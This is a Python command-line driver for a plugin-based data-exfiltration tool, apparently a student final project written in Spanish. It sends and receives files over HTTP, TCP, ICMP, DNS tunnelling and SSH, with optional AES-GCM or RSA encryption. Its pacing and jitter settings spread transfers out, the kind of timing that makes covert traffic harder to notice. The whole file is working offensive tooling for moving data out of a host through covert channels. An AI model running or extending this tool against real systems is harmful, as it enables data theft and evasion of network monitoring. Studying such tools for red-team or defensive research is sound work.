from __future__ import annotations
import argparse, json, sys, os, time
from pathlib import Path
from typing import Iterable

from tfg.core.enums import Modo, Estado, TipoCanal, EsquemaCifrado, TipoRecurso
from tfg.core.models import Transferencia, Canal, RecursoDatos
from tfg.plugins.loader import resolve_exfil_plugin, resolve_crypto_plugin, scan_plugins

def _canal_from_str(s: str) -> TipoCanal:
    s = s.strip().upper()
    return TipoCanal[s] if s in TipoCanal.__members__ else TipoCanal.HTTP

def _esquema_from_str(s: str) -> EsquemaCifrado:
    s = s.strip().upper()
    return EsquemaCifrado[s] if s in EsquemaCifrado.__members__ else EsquemaCifrado.NINGUNO

def _tipo_recurso_from_str(s: str) -> TipoRecurso:
    s = s.strip().upper()
    return TipoRecurso[s] if s in TipoRecurso.__members__ else TipoRecurso.ARCHIVO

def _read_file_bytes(path: str) -> bytes:
    return Path(path).read_bytes()

def _write_file_bytes(path: str, data_iter: Iterable[bytes]) -> int:
    total = 0
    with open(path, "wb") as f:
        for chunk in data_iter:
            f.write(chunk)
            total += len(chunk)
    return total

def _filter_meta_to_public(meta: dict) -> dict:
    return {k:v for k,v in meta.items() if not k.startswith("_")}

def _maybe_http_cfg(canal, args, modo: str):
    try:
        if canal.tipo != TipoCanal.HTTP:
            return {}
    except Exception:
        return {}
    host = args.host
    port = args.puerto
    ruta = args.ruta or "/upload"
    if isinstance(ruta, str) and (ruta.startswith("http://") or ruta.startswith("https://")):
        url = ruta
    else:
        scheme = "https" if port == 443 else "http"
        hostpart = host or "127.0.0.1"
        portpart = f":{port}" if (port and port not in (80,443)) else ("" if port in (80,443) else "")
        path = ruta if (isinstance(ruta,str) and ruta.startswith("/")) else f"/{ruta}" if ruta else "/upload"
        url = f"{scheme}://{hostpart}{portpart}{path}"
    base = {}
    if modo == "send":
        base = {"url": url}
    else:
        bind_host = host or "0.0.0.0"
        bind_port = port or (443 if url.startswith("https://") else 8080)
        path = ruta if (isinstance(ruta,str) and ruta.startswith("/")) else f"/{ruta}" if ruta else "/upload"
        base = {"bind_host": bind_host, "bind_port": bind_port, "path": path}
    if getattr(args, "auth_token", None):
        base["auth_token"] = args.auth_token
    if getattr(args, "resume_probe", False):
        base["resume_probe"] = True
    if getattr(args, "retries", None) is not None:
        base["retries"] = int(args.retries)
    if getattr(args, "retry_backoff_ms", None) is not None:
        base["retry_backoff_ms"] = int(args.retry_backoff_ms)
    if getattr(args, "ritmo_base_ms", None) is not None:
        base["ritmo_base_ms"] = int(args.ritmo_base_ms)
    if getattr(args, "ritmo_dispersion_ms", None) is not None:
        base["ritmo_dispersion_ms"] = int(args.ritmo_dispersion_ms)
    return base

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="tfg_cli", description="TFG: exfil modular con plugins")
    p.add_argument("--plugins-dir", default="plugins", help="Directorio de plugins")

    sub = p.add_subparsers(dest="cmd", required=True)

    sp = sub.add_parser("scan-plugins", help="Listar plugins detectados")
    sp.set_defaults(func=cmd_scan)

    sp = sub.add_parser("check-file", help="Comprobar recurso archivo")
    sp.add_argument("--recurso-ubicacion", required=True)
    sp.set_defaults(func=cmd_check_file)

    common = {
        "transfer-id": {"required": True},
        "canal": {"required": True},
        "metodo": {"type": int, "required": True},
        "host": {"required": False},
        "puerto": {"type": int, "required": False},
        "ruta": {"required": False},
        "cifrado": {"required": True, "choices": ["NINGUNO","SIMETRICO","ASIMETRICO"]},
        "algoritmo": {"required": False, "help": "SIMETRICO: AESGCM | ASIMETRICO: RSA_OAEP"},
        "clave-publica": {"required": False},
        "clave-privada": {"required": False},
        "auth-token": {"required": False, "help": "Token compartido para autenticar contra el receptor (X-Auth-Token)"},
    }

    sp = sub.add_parser("send", help="Enviar recurso")
    for arg, kw in common.items():
        sp.add_argument(f"--{arg}", **kw)
    sp.add_argument("--iface", required=False, help="Interfaz de captura/envío RAW (ej. \\Device\\NPF_{GUID})")
    sp.add_argument("--root-domain", required=False, help="Dominio raíz para exfil DNS (ej. exfil.local)")
    sp.add_argument("--ttl-base", type=int, required=False, help="Base TTL para ICMP método 3")
    sp.add_argument("--timeout-s", type=int, required=False, help="Timeout de recepción (plugins que lo soporten)")
    sp.add_argument("--ssh-user", required=False, help="Usuario SSH/SFTP")
    sp.add_argument("--ssh-pass", required=False, help="Contraseña SSH/SFTP")
    sp.add_argument("--remote-dir", required=False, default=".", help="Directorio remoto SSH/SFTP")
    sp.add_argument("--recurso-tipo", required=True, choices=[e.name for e in TipoRecurso])
    sp.add_argument("--recurso-ubicacion", required=True)
    sp.add_argument("--fragment-size", type=int, default=1024)
    sp.add_argument("--crypto-meta-out", required=False, help="Ruta donde guardar meta CRYPTO (JSON)")
    # Robustez
    sp.add_argument("--retries", type=int, default=3, help="Reintentos por fragmento")
    sp.add_argument("--retry-backoff-ms", type=int, default=250, help="Backoff exponencial base")
    sp.add_argument("--ritmo-base-ms", type=int, default=0, help="Espera base entre fragmentos")
    sp.add_argument("--ritmo-dispersion-ms", type=int, default=0, help="Jitter +/- en ms")
    sp.add_argument("--resume-probe", action="store_true", help="Sondea estado del receptor para reanudar (mejor en LAN)")
    sp.set_defaults(func=cmd_send)

    sp = sub.add_parser("receive", help="Recibir recurso")
    for arg, kw in common.items():
        sp.add_argument(f"--{arg}", **kw)
    sp.add_argument("--iface", required=False, help="Interfaz de captura/envío RAW (ej. \\Device\\NPF_{GUID})")
    sp.add_argument("--root-domain", required=False, help="Dominio raíz para exfil DNS (ej. exfil.local)")
    sp.add_argument("--ttl-base", type=int, required=False, help="Base TTL para ICMP método 3")
    sp.add_argument("--timeout-s", type=int, required=False, help="Timeout de recepción (plugins que lo soporten)")
    sp.add_argument("--ssh-user", required=False, help="Usuario SSH/SFTP")
    sp.add_argument("--ssh-pass", required=False, help="Contraseña SSH/SFTP")
    sp.add_argument("--remote-dir", required=False, default=".", help="Directorio remoto SSH/SFTP")
    sp.add_argument("--out-file", required=True, help="Ruta de salida del reconstruido")
    sp.add_argument("--crypto-meta-in", required=False, help="Meta CRYPTO (JSON) para descifrar")
    sp.set_defaults(func=cmd_receive)

    return p

def cmd_scan(args: argparse.Namespace) -> int:
    reg = scan_plugins(args.plugins_dir)
    print("EXFIL CLIENT:")
    for (canal, metodo), cls in sorted(reg.exfil_client.items()):
        print(f"  {canal}/{metodo} -> {cls.__name__}")
    print("EXFIL SERVER:")
    for (canal, metodo), cls in sorted(reg.exfil_server.items()):
        print(f"  {canal}/{metodo} -> {cls.__name__}")
    print("CRYPTO ENCRYPT:")
    for (esq, alg), cls in sorted(reg.crypto_enc.items()):
        print(f"  {esq}/{alg} -> {cls.__name__}")
    print("CRYPTO DECRYPT:")
    for (esq, alg), cls in sorted(reg.crypto_dec.items()):
        print(f"  {esq}/{alg} -> {cls.__name__}")
    return 0

def cmd_check_file(args: argparse.Namespace) -> int:
    p = Path(args.recurso_ubicacion)
    if not p.exists():
        print("NO_EXISTE")
        return 2
    print(f"OK size={p.stat().st_size} path={p}")
    return 0

def cmd_send(args: argparse.Namespace) -> int:
    t = Transferencia(id=args.transfer_id, modo=Modo.EMISOR)
    t.iniciar()

    canal = Canal(tipo=_canal_from_str(args.canal), metodo=int(args.metodo))
    canal.validarConfiguracion()

    recurso = RecursoDatos(tipo=_tipo_recurso_from_str(args.recurso_tipo), ubicacion=args.recurso_ubicacion)
    if not recurso.esAccesible():
        t.finalizarComoFallida("Recurso no accesible")
        print("ERROR: recurso no accesible")
        return 2

    cfg = {"exfil_id": args.transfer_id, **_maybe_http_cfg(canal, args, "send"), **_maybe_tcp_cfg(canal, args, "send"), **_maybe_icmp_cfg(canal, args, "send"), **_maybe_dns_cfg(canal, args, "send"), **_maybe_ssh_cfg(canal, args, "send")}

    if args.cifrado.upper() != "NINGUNO":
        if not args.algoritmo:
            print("ERROR: --algoritmo requerido cuando hay cifrado"); return 2
        if args.cifrado.upper() == "SIMETRICO":
            key_bytes = _read_file_bytes(args.clave_privada) if args.clave_privada else b""
            enc = resolve_crypto_plugin(EsquemaCifrado.SIMETRICO, args.algoritmo, "encrypt", args.plugins_dir)
            meta = enc.init({"key_bytes": key_bytes})
            meta["_key_bytes"] = key_bytes
            if args.crypto_meta_out:
                Path(args.crypto_meta_out).write_text(json.dumps(_filter_meta_to_public(meta), indent=2), encoding="utf-8")
            payload_iter = enc.encrypt_iter(meta, recurso.iter_chunks(args.fragment_size))
        else:
            pub = _read_file_bytes(args.clave_publica) if args.clave_publica else b""
            enc = resolve_crypto_plugin(EsquemaCifrado.ASIMETRICO, args.algoritmo, "encrypt", args.plugins_dir)
            meta = enc.init({"public_key_bytes": pub})
            if args.crypto_meta_out:
                Path(args.crypto_meta_out).write_text(json.dumps(_filter_meta_to_public(meta), indent=2), encoding="utf-8")
            payload_iter = enc.encrypt_iter(meta, recurso.iter_chunks(args.fragment_size))
    else:
        payload_iter = recurso.iter_chunks(args.fragment_size)

    # FIX: usar nombre del Enum (p.ej. "HTTP") para resolver plugins
    client = resolve_exfil_plugin(canal.tipo.name, canal.metodo, "client", args.plugins_dir)
    res = client.run(cfg, payload_iter)
    t.finalizarComoCompletada()
    print(json.dumps({"ok": True, "transferencia": t.id, "resumen": res}, indent=2))
    return 0

def cmd_receive(args: argparse.Namespace) -> int:
    t = Transferencia(id=args.transfer_id, modo=Modo.RECEPTOR)
    t.iniciar()

    canal = Canal(tipo=_canal_from_str(args.canal), metodo=int(args.metodo))
    canal.validarConfiguracion()

    cfg = {"exfil_id": args.transfer_id, **_maybe_http_cfg(canal, args, "receive"), **_maybe_tcp_cfg(canal, args, "receive"), **_maybe_icmp_cfg(canal, args, "receive"), **_maybe_dns_cfg(canal, args, "receive"), **_maybe_ssh_cfg(canal, args, "receive")}

    # FIX: usar nombre del Enum (p.ej. "HTTP") para resolver plugins
    server = resolve_exfil_plugin(canal.tipo.name, canal.metodo, "server", args.plugins_dir)
    stream = server.run(cfg)

    if args.cifrado.upper() != "NINGUNO":
        if not args.algoritmo:
            print("ERROR: --algoritmo requerido cuando hay cifrado"); return 2
        meta = {}
        if args.crypto_meta_in:
            meta = json.loads(Path(args.crypto_meta_in).read_text(encoding="utf-8"))
        if args.cifrado.upper() == "SIMETRICO":
            key_bytes = _read_file_bytes(args.clave_privada) if args.clave_privada else b""
            meta["_key_bytes"] = key_bytes
            dec = resolve_crypto_plugin(EsquemaCifrado.SIMETRICO, args.algoritmo, "decrypt", args.plugins_dir)
            stream = dec.decrypt_iter(meta, stream)
        else:
            priv = _read_file_bytes(args.clave_privada) if args.clave_privada else b""
            meta["_private_key_bytes"] = priv
            dec = resolve_crypto_plugin(EsquemaCifrado.ASIMETRICO, args.algoritmo, "decrypt", args.plugins_dir)
            stream = dec.decrypt_iter(meta, stream)

    total = _write_file_bytes(args.out_file, stream)
    t.finalizarComoCompletada()
    print(json.dumps({"ok": True, "transferencia": t.id, "bytes": total, "out": args.out_file}, indent=2))
    return 0

def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return args.func(args)


def _maybe_tcp_cfg(canal, args, modo: str):
    try:
        from tfg.core.enums import TipoCanal
        if canal.tipo != TipoCanal.TCP:
            return {}
    except Exception:
        return {}
    host = args.host
    port = args.puerto or 9000
    base = {}
    if modo == "send":
        base = {"host": host or "127.0.0.1", "port": port}
    else:
        base = {"bind_host": host or "0.0.0.0", "bind_port": port}
    if getattr(args, "auth_token", None):
        base["auth_token"] = args.auth_token
    if getattr(args, "ritmo_base_ms", None) is not None:
        base["ritmo_base_ms"] = int(args.ritmo_base_ms)
    if getattr(args, "ritmo_dispersion_ms", None) is not None:
        base["ritmo_dispersion_ms"] = int(args.ritmo_dispersion_ms)
    if getattr(args, "timeout_s", None) is not None:
        base["timeout_s"] = int(args.timeout_s)
    if getattr(args, "iface", None):
        base["iface"] = args.iface
    return base


def _maybe_icmp_cfg(canal, args, modo: str):
    try:
        from tfg.core.enums import TipoCanal
        if canal.tipo != TipoCanal.ICMP:
            return {}
    except Exception:
        return {}
    cfg = {}
    # Para servidor: podemos filtrar por destino (--host). Para cliente: es el objetivo.
    if getattr(args, "host", None):
        cfg["host"] = args.host
    if getattr(args, "auth_token", None):
        cfg["auth_token"] = args.auth_token
    if getattr(args, "iface", None):
        cfg["iface"] = args.iface
    if getattr(args, "ttl_base", None) is not None:
        cfg["ttl_base"] = int(args.ttl_base)
    if getattr(args, "ritmo_base_ms", None) is not None:
        cfg["ritmo_base_ms"] = int(args.ritmo_base_ms)
    if getattr(args, "ritmo_dispersion_ms", None) is not None:
        cfg["ritmo_dispersion_ms"] = int(args.ritmo_dispersion_ms)
    return cfg


def _maybe_ssh_cfg(canal, args, modo: str):
    try:
        from tfg.core.enums import TipoCanal
        if canal.tipo != TipoCanal.SSH:
            return {}
    except Exception:
        return {}
    base = {
        "host":       getattr(args, "host", None) or "127.0.0.1",
        "port":       int(getattr(args, "puerto", None) or 22),
        "user":       getattr(args, "ssh_user", None) or "",
        "password":   getattr(args, "ssh_pass", None),
        "remote_dir": getattr(args, "remote_dir", None) or ".",
    }
    if getattr(args, "timeout_s", None) is not None:
        base["timeout_s"] = int(args.timeout_s)
    return base


def _maybe_dns_cfg(canal, args, modo: str):
    try:
        from tfg.core.enums import TipoCanal
        if canal.tipo != TipoCanal.DNS:
            return {}
    except Exception:
        return {}
    host        = args.host
    port        = args.puerto or 53
    root_domain = getattr(args, "root_domain", None) or "exfil.local"
    if modo == "send":
        return {"host": host or "127.0.0.1", "port": port, "root_domain": root_domain}
    else:
        return {"bind_host": host or "0.0.0.0", "bind_port": port}


def _resolve_crypto_decryptor(scheme: str, algo: str):
    from tfg.plugins.loader import resolve_crypto_plugin
    dec = resolve_crypto_plugin(scheme=scheme, algorithm=algo, kind="decrypt", plugins_dir="plugins")
    if dec is None:
        raise RuntimeError(f"decryptor no disponible: {scheme}/{algo}")
    def init(params):
        return dec.init(params or {})
    def decrypt_iter(meta, stream):
        return dec.decrypt_iter(meta, stream)
    return (init, decrypt_iter)

if __name__ == "__main__":
    raise SystemExit(main())